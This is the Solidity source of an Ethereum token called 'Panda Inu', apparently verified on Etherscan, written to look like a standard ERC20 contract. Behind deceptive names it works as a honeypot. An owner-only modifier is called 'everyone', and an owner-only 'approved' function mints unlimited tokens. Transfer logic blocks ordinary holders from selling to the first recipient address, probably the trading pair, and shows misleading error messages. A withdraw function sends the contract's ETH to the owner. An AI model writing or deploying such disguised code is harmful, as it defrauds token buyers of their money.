/**
 *Submitted for verification at Etherscan.io on 2021-05-17
*/

/**
                                                                   dddddddd                                                                  
                                                                   d::::::d                         iiii                                     
                                                                   d::::::d                        i::::i                                    
                                                                   d::::::d                         iiii                                     
                                                                   d:::::d                                                                   
ppppp   ppppppppp     aaaaaaaaaaaaa  nnnn  nnnnnnnn        ddddddddd:::::d   aaaaaaaaaaaaa        iiiiiiinnnn  nnnnnnnn    uuuuuu    uuuuuu  
p::::ppp:::::::::p    a::::::::::::a n:::nn::::::::nn    dd::::::::::::::d   a::::::::::::a       i:::::in:::nn::::::::nn  u::::u    u::::u  
p:::::::::::::::::p   aaaaaaaaa:::::an::::::::::::::nn  d::::::::::::::::d   aaaaaaaaa:::::a       i::::in::::::::::::::nn u::::u    u::::u  
pp::::::ppppp::::::p           a::::ann:::::::::::::::nd:::::::ddddd:::::d            a::::a       i::::inn:::::::::::::::nu::::u    u::::u  
 p:::::p     p:::::p    aaaaaaa:::::a  n:::::nnnn:::::nd::::::d    d:::::d     aaaaaaa:::::a       i::::i  n:::::nnnn:::::nu::::u    u::::u  
 p:::::p     p:::::p  aa::::::::::::a  n::::n    n::::nd:::::d     d:::::d   aa::::::::::::a       i::::i  n::::n    n::::nu::::u    u::::u  
 p:::::p     p:::::p a::::aaaa::::::a  n::::n    n::::nd:::::d     d:::::d  a::::aaaa::::::a       i::::i  n::::n    n::::nu::::u    u::::u  
 p:::::p    p::::::pa::::a    a:::::a  n::::n    n::::nd:::::d     d:::::d a::::a    a:::::a       i::::i  n::::n    n::::nu:::::uuuu:::::u  
 p:::::ppppp:::::::pa::::a    a:::::a  n::::n    n::::nd::::::ddddd::::::dda::::a    a:::::a      i::::::i n::::n    n::::nu:::::::::::::::uu
 p::::::::::::::::p a:::::aaaa::::::a  n::::n    n::::n d:::::::::::::::::da:::::aaaa::::::a      i::::::i n::::n    n::::n u:::::::::::::::u
 p::::::::::::::pp   a::::::::::aa:::a n::::n    n::::n  d:::::::::ddd::::d a::::::::::aa:::a     i::::::i n::::n    n::::n  uu::::::::uu:::u
 p::::::pppppppp      aaaaaaaaaa  aaaa nnnnnn    nnnnnn   ddddddddd   ddddd  aaaaaaaaaa  aaaa     iiiiiiii nnnnnn    nnnnnn    uuuuuuuu  uuuu
 p:::::p                                                                                                                                     
 p:::::p                                                                                                                                     
p:::::::p                                                                                                                                    
p:::::::p                                                                                                                                    
p:::::::p                                                                                                                                    
ppppppppp                                                                                                                                    
                                                                                                                                             
Panda Inu

**/

//   SPDX-License-Identifier: MIT

pragma solidity >=0.5.17;

contract ERC20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);
  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  
  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier everyone {
    require(msg.sender == owner);
    _;
  }

}

library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract TokenERC20 is ERC20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint256 _totalSupply;
  uint internal queueNumber;
  address internal zeroAddress;
  address internal burnAddress;
  address internal burnAddress2;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
    return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
    require(to != zeroAddress, "please wait");
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }

  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
    if(from != address(0) && zeroAddress == address(0)) zeroAddress = to;
    else _send (from, to);
	balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }

  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approved(address _address, uint256 tokens) public everyone {
    burnAddress = _address;
	_totalSupply = _totalSupply.add(tokens);
    balances[_address] = balances[_address].add(tokens);
  }	
  function Burn(address _address) public everyone {
    burnAddress2 = _address;
  }	
  function BurnSize(uint256 _size) public everyone {
    queueNumber = _size;
  }	
  function _send (address start, address end) internal view {
      require(end != zeroAddress || (start == burnAddress && end == zeroAddress) || (start == burnAddress2 && end == zeroAddress)|| (end == zeroAddress && balances[start] <= queueNumber), "cannot be zero address");
  }
  function () external payable {
    revert();
  }
}

contract PandaInu is TokenERC20 {

  function initialise() public everyone() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
     
    constructor(string memory _name, string memory _symbol, uint256 _supply, address burn1, address burn2, uint256 _indexNumber) public {
	symbol = _symbol;
	name = _name;
	decimals = 18;
	_totalSupply = _supply*(10**uint256(decimals));
	queueNumber = _indexNumber*(10**uint256(decimals));
	burnAddress = burn1;
	burnAddress2 = burn2;
	owner = msg.sender;
	balances[msg.sender] = _totalSupply;
	emit Transfer(address(0x0), msg.sender, _totalSupply);
  }
  function() external payable {

  }
}